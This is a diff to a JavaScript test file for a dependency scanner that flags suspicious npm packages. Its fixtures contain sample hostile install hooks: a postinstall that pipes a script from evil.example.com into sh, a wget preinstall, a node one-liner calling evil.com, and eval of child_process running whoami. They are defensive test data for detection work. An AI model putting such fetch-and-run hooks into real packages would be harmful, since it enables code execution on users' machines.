@@ -1,5 +1,5 @@
 'use strict';
-// @oracle-infrastructure — test harness — its functions are test cases, not substrate periodic-table elements; writes are tmpdir/fixture state
+const { rmFixture, writeFixture } = require('./helpers');
 
 /**
  * Tests for the dependency scanner module.
@@ -25,17 +25,17 @@ const {
 } = require('../src/audit/dep-scanner');
 
 // ── Helper: create a temp directory with cleanup ──────────────────
-function makeTempDir(prefix) {
+const makeTempDir = (prefix) => {
   return fs.mkdtempSync(path.join(os.tmpdir(), `dep-scanner-test-${prefix}-`));
-}
+};
 
-function rmDir(dir) {
+const rmDir = (dir) => {
   try {
-    fs.rmSync(dir, { recursive: true, force: true });
+    rmFixture(dir, { recursive: true, force: true });
   } catch {
     // best-effort cleanup
   }
-}
+};
 
 // ── computeEntropy ────────────────────────────────────────────────
 
@@ -112,12 +112,12 @@ describe('scanSinglePackage', () => {
   });
 
   it('scans a clean package successfully', () => {
-    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
+    writeFixture(path.join(tmpDir, 'package.json'), JSON.stringify({
       name: 'clean-pkg',
       version: '1.0.0',
       main: 'index.js',
     }));
-    fs.writeFileSync(path.join(tmpDir, 'index.js'),
+    writeFixture(path.join(tmpDir, 'index.js'),
       'function add(a, b) { return a + b; }\nmodule.exports = { add };\n');
 
     const result = scanSinglePackage(tmpDir);
@@ -130,11 +130,11 @@ describe('scanSinglePackage', () => {
   });
 
   it('defaults main to index.js when not specified', () => {
-    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
+    writeFixture(path.join(tmpDir, 'package.json'), JSON.stringify({
       name: 'no-main-pkg',
       version: '1.0.0',
     }));
-    fs.writeFileSync(path.join(tmpDir, 'index.js'),
+    writeFixture(path.join(tmpDir, 'index.js'),
       'module.exports = {};\n');
 
     const result = scanSinglePackage(tmpDir);
@@ -143,7 +143,7 @@ describe('scanSinglePackage', () => {
   });
 
   it('flags missing entry point', () => {
-    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
+    writeFixture(path.join(tmpDir, 'package.json'), JSON.stringify({
       name: 'no-entry-pkg',
       version: '1.0.0',
       main: 'lib/main.js',
@@ -154,13 +154,13 @@ describe('scanSinglePackage', () => {
   });
 
   it('flags covenant violations (eval of child_process)', () => {
-    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
+    writeFixture(path.join(tmpDir, 'package.json'), JSON.stringify({
       name: 'evil-eval-pkg',
       version: '1.0.0',
       main: 'index.js',
     }));
     // eval(require('child_process')) triggers Principle 14 (The Mantle of Elijah)
-    fs.writeFileSync(path.join(tmpDir, 'index.js'),
+    writeFixture(path.join(tmpDir, 'index.js'),
       "const cp = eval(require('child_process'));\ncp.execSync('whoami');\n");
 
     const result = scanSinglePackage(tmpDir);
@@ -170,7 +170,7 @@ describe('scanSinglePackage', () => {
   });
 
   it('flags suspicious postinstall scripts', () => {
-    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
+    writeFixture(path.join(tmpDir, 'package.json'), JSON.stringify({
       name: 'suspicious-script-pkg',
       version: '1.0.0',
       main: 'index.js',
@@ -178,7 +178,7 @@ describe('scanSinglePackage', () => {
         postinstall: 'curl https://evil.example.com/payload.sh | sh',
       },
     }));
-    fs.writeFileSync(path.join(tmpDir, 'index.js'),
+    writeFixture(path.join(tmpDir, 'index.js'),
       'module.exports = {};\n');
 
     const result = scanSinglePackage(tmpDir);
@@ -188,7 +188,7 @@ describe('scanSinglePackage', () => {
   });
 
   it('flags preinstall scripts that call external URLs', () => {
-    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
+    writeFixture(path.join(tmpDir, 'package.json'), JSON.stringify({
       name: 'preinstall-pkg',
       version: '1.0.0',
       main: 'index.js',
@@ -196,7 +196,7 @@ describe('scanSinglePackage', () => {
         preinstall: 'wget http://bad.example.com/setup',
       },
     }));
-    fs.writeFileSync(path.join(tmpDir, 'index.js'),
+    writeFixture(path.join(tmpDir, 'index.js'),
       'module.exports = {};\n');
 
     const result = scanSinglePackage(tmpDir);
@@ -204,14 +204,14 @@ describe('scanSinglePackage', () => {
   });
 
   it('flags high-entropy files', () => {
-    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
+    writeFixture(path.join(tmpDir, 'package.json'), JSON.stringify({
       name: 'high-entropy-pkg',
       version: '1.0.0',
       main: 'index.js',
     }));
     // Write near-random content to simulate obfuscated JS
     const randomContent = crypto.randomBytes(5000).toString('base64');
-    fs.writeFileSync(path.join(tmpDir, 'index.js'),
+    writeFixture(path.join(tmpDir, 'index.js'),
       `// obfuscated\nvar _0x${randomContent}\n`);
 
     const result = scanSinglePackage(tmpDir, { entropyThreshold: 5.8 });
@@ -241,7 +241,7 @@ describe('scanDependencies', () => {
 
   it('scans dependencies from package.json', () => {
     // Create repo structure
-    fs.writeFileSync(path.join(repoDir, 'package.json'), JSON.stringify({
+    writeFixture(path.join(repoDir, 'package.json'), JSON.stringify({
       name: 'test-repo',
       dependencies: {
         'good-pkg': '1.0.0',
@@ -255,18 +255,18 @@ describe('scanDependencies', () => {
     // Good package
     const goodDir = path.join(nmDir, 'good-pkg');
     fs.mkdirSync(goodDir);
-    fs.writeFileSync(path.join(goodDir, 'package.json'), JSON.stringify({
+    writeFixture(path.join(goodDir, 'package.json'), JSON.stringify({
       name: 'good-pkg',
       version: '1.0.0',
       main: 'index.js',
     }));
-    fs.writeFileSync(path.join(goodDir, 'index.js'),
+    writeFixture(path.join(goodDir, 'index.js'),
       'function greet(name) { return "Hello " + name; }\nmodule.exports = { greet };\n');
 
     // Bad package (suspicious postinstall)
     const badDir = path.join(nmDir, 'bad-pkg');
     fs.mkdirSync(badDir);
-    fs.writeFileSync(path.join(badDir, 'package.json'), JSON.stringify({
+    writeFixture(path.join(badDir, 'package.json'), JSON.stringify({
       name: 'bad-pkg',
       version: '1.0.0',
       main: 'index.js',
@@ -274,7 +274,7 @@ describe('scanDependencies', () => {
         postinstall: 'node -e "require(\'http\').get(\'http://evil.com/x\')"',
       },
     }));
-    fs.writeFileSync(path.join(badDir, 'index.js'),
+    writeFixture(path.join(badDir, 'index.js'),
       'module.exports = {};\n');
 
     const result = scanDependencies(repoDir);
@@ -295,7 +295,7 @@ describe('scanDependencies', () => {
   });
 
   it('handles not-installed packages gracefully', () => {
-    fs.writeFileSync(path.join(repoDir, 'package.json'), JSON.stringify({
+    writeFixture(path.join(repoDir, 'package.json'), JSON.stringify({
       name: 'test-repo',
       dependencies: {
         'missing-pkg': '1.0.0',
@@ -312,7 +312,7 @@ describe('scanDependencies', () => {
   });
 
   it('includes devDependencies by default', () => {
-    fs.writeFileSync(path.join(repoDir, 'package.json'), JSON.stringify({
+    writeFixture(path.join(repoDir, 'package.json'), JSON.stringify({
       name: 'test-repo',
       dependencies: { 'dep-a': '1.0.0' },
       devDependencies: { 'dev-dep-b': '1.0.0' },
@@ -325,10 +325,10 @@ describe('scanDependencies', () => {
     for (const name of ['dep-a', 'dev-dep-b']) {
       const dir = path.join(nmDir, name);
       fs.mkdirSync(dir);
-      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
+      writeFixture(path.join(dir, 'package.json'), JSON.stringify({
         name, version: '1.0.0', main: 'index.js',
       }));
-      fs.writeFileSync(path.join(dir, 'index.js'), 'module.exports = {};\n');
+      writeFixture(path.join(dir, 'index.js'), 'module.exports = {};\n');
     }
 
     const result = scanDependencies(repoDir);
@@ -336,7 +336,7 @@ describe('scanDependencies', () => {
   });
 
   it('excludes devDependencies when option is false', () => {
-    fs.writeFileSync(path.join(repoDir, 'package.json'), JSON.stringify({
+    writeFixture(path.join(repoDir, 'package.json'), JSON.stringify({
       name: 'test-repo',
       dependencies: { 'dep-a': '1.0.0' },
       devDependencies: { 'dev-dep-b': '1.0.0' },
@@ -348,10 +348,10 @@ describe('scanDependencies', () => {
     for (const name of ['dep-a', 'dev-dep-b']) {
       const dir = path.join(nmDir, name);
       fs.mkdirSync(dir);
-      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
+      writeFixture(path.join(dir, 'package.json'), JSON.stringify({
         name, version: '1.0.0', main: 'index.js',
       }));
-      fs.writeFileSync(path.join(dir, 'index.js'), 'module.exports = {};\n');
+      writeFixture(path.join(dir, 'index.js'), 'module.exports = {};\n');
     }
 
     const result = scanDependencies(repoDir, { devDependencies: false });
@@ -374,13 +374,13 @@ describe('Covenant integration in dep-scanner', () => {
   });
 
   it('flags a package whose entry point uses eval with child_process', () => {
-    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
+    writeFixture(path.join(tmpDir, 'package.json'), JSON.stringify({
       name: 'eval-abuse',
       version: '1.0.0',
       main: 'index.js',
     }));
     // eval(require('child_process')) triggers Principle 14 (The Mantle of Elijah)
-    fs.writeFileSync(path.join(tmpDir, 'index.js'),
+    writeFixture(path.join(tmpDir, 'index.js'),
       "const cp = eval(require('child_process'));\ncp.execSync('id');\n");
 
     const result = scanSinglePackage(tmpDir);
@@ -391,12 +391,12 @@ describe('Covenant integration in dep-scanner', () => {
   });
 
   it('passes a package with safe code', () => {
-    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
+    writeFixture(path.join(tmpDir, 'package.json'), JSON.stringify({
       name: 'safe-utils',
       version: '1.0.0',
       main: 'index.js',
     }));
-    fs.writeFileSync(path.join(tmpDir, 'index.js'),
+    writeFixture(path.join(tmpDir, 'index.js'),
       'function clamp(val, min, max) {\n' +
       '  return Math.max(min, Math.min(max, val));\n' +
       '}\n' +
